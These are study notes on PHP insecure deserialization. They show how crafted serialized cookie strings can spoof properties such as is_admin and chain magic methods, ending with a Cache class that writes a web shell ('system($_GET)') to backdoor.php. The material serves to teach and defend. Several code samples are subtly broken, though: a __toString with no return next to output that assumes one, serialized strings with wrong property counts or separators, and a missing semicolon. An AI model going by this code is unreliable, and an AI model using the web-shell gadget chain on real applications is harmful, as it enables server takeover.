This can happen in PHP, Java, .NET, Ruby, Python and maybe more.
To understand deserialization, first look at [[Serialization]]
## Code example

Lets say we have these codes
```php
// user.class.php

<?php

class User {
	var $firstname;
	var $lastname;
	
	function __construct($firstname = "", $lastname = "")
	{
		$this->firstname = $firstname;
		$this->lastname = $lastname;
	}
	
	function __toString()
	{
		$this->firstname." ".$this->lastname;
	}
	
	function __destruct()
	{
		echo "Object Destruction: ". $this->firstname." ". $this->lastname;
	}
	
	function __wakeup()
	{
		echo "The class has woken up!";
	}
}
```

```php
// serialize.php

<?php
require_once("user.class.php");

$user = new User("Mehmet", "INCE");

$store_somewhere = serialize($user);
```

```php
// deserialize.php

<?php
// Require needed class (User class)
require_once("user.class.php");

$serialized_str = 'O:4:"User":2:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:4:"INCE";}';

$user = unserialize($serialized_str);

echo $user;
```

When an object (or a class) gets serialized or deserialized, that class gets generated by the interpreter, therefore, some magic methods, such as `__destruct` are automatically called.

> [!info] `__destruct` is called automatically
> If you were to serialize this code once again, it would also fire destruct method even though we did not call it. Meaning that `__destruct` method is called automatically

---
## Running the code
Lets run the `serialize.php` and `deserialize.php` codes

> [!important] Executing `serialize.php` and `deserialize.php`
> Result of code executions
> 
> ```bash
> # Result of `php serialize.php`
> Object destruction: Mehmet INCE
> 
> # Result of 'php deserialize.php'
> Mehmet INCEObject destruction: Mehmet INCE
> ```

Another magic method we have is `__wakeup()`. It gets fired when the class is generated. 
Lets run the code again

```bash
# Result of `php deserialize.php`
The class has woken up!Object destruction: Mehmet INCE
```

This is basically PHP class lifecycle:
`__wakeup()` runs first. And when the class gets destroyed `__destruct()` gets called

---
## Payload Scenario

Imagine this scenario

```php
// serialize.php

<?php
require_once("user.class.php");

$user = new User("Mehmet", "INCE");

$store_somewhere = serialize($user);

$http->set_cookie("User", $store_somewhere)
```

A developer decided it would be a good idea to store the serialized data on client side, and whenever the client comes back, the code will take the serialized string from cookie and pass it to deserializer code

Your payload might arrive here

```php
// deserialize.php

<?php
// Require needed class (User class)
require_once("user.class.php");

$serialized_str = $payload; // UNTRUSTED SOURCE HERE!

$user = unserialize($serialized_str);

echo $user;
```

Lets generate a payload. 

```php
// deserialize.php

<?php
// Require needed class (User class)
require_once("user.class.php");

$payload=""; // UNTRUSTED SOURCE HERE! 

$payload='O:6:"MDISEC":2:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:4:"INCE";}';

$user = unserialize($payload);

echo $user;
```

> [!attention] Offset error
> O:4:"User" means object with name length of 4 (User). 
> If you only change the name but not the length, PHP will give offset error

But as there is no class called `MDISEC` it returns an error

This whole thing means you can initiate any existing class within the codebase

### Very dangerous example

Imagine the user class has a property (variable) called `is_admin` and is set to 0 by default. 
It can become [[Privilege Escalation]] at this point

Here you can see the new serialization with new `is_admin` property. It is an int and is set to 0

```bash
php serialize.php

O:6:"MDISEC":2:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:4:"INCE";s:8:"is_admin";i:0;}
```

>This becomes very dangerous, as you can spoof any property of any class within the namespace!

Instead of just `is_admin=0` think about a scenario where there is a Permissions class and something like this happens

`$this->is_admin = new Permissions();`

Then you would need to change your payload like this (Object `Permissions` with length of 11)

```php
$payload='O:6:"MDISEC":2:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:4:"INCE";s:8:"is_admin";O:11:"Permissions";}'
```

---
### + Permissions class

```php
class Permissions {
	var $permissionArr = array();
	
	function __wakeup()
	{
		echo "Permission class woke up";
	}
}

class User {
	var $firstname;
	var $lastname;
	var $is_admin=0;
	
	function __construct($firstname = "", $lastname = "")
	{
		$this->firstname = $firstname;
		$this->lastname = $lastname;
		$this->is_admin = new Permissions(); // Developer will write zero here
	}
	
	function __toString()
	{
		$this->firstname." ".$this->lastname;
	}
	
	function __destruct()
	{
		echo "Object Destruction: ". $this->firstname." ". $this->lastname;
	}
	
	function __wakeup()
	{
		echo "The class has woken up!";
	}
}
```

When serialized, this class will look like this

```bash
O:4:"User":3:{s:9:"firstname";s:6:"Mehmet";s:8:"lastname";s:4:"INCE";s:8:"is_admin";O:11:"Permissions":1:{s:13:"permissionArr",a:0:{}}}
```

And this will be your payload to use. When deserialized, this code will use `Permissions` class therefore the code inside `__wakeup()` will run

`Permission class woke up`

---
### + Cache class

```php
<?php

class Cache {
	var $filename;
	var $content;
	
	function __destruct()
	{
		file_put_contents(
			$this->filename, // /var/www/html/backdoor.php
			$this->content  // <?php system($_GET);
		)
	}
}

class Permissions {
	...
}

class User {
	...
}
```

So basically what happened is the following:
1) We chained `is_admin` from `User` class to `Permissions` class `__wakeup()` method 
2) From `Permissions` we chained `Cache` class

---
## Important Notes

> [!important]
> Deserialization can happen in other structures that are different than Class

---
## Related links

Check out these videos about Deserialization by mdisec:
1) [Deserialization-Episode-1](https://youtu.be/0Oj8FVDcpwU?list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT)
2) [Deserialization-Episode-2](https://youtu.be/wvNGCBDbENY?list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT)
3) 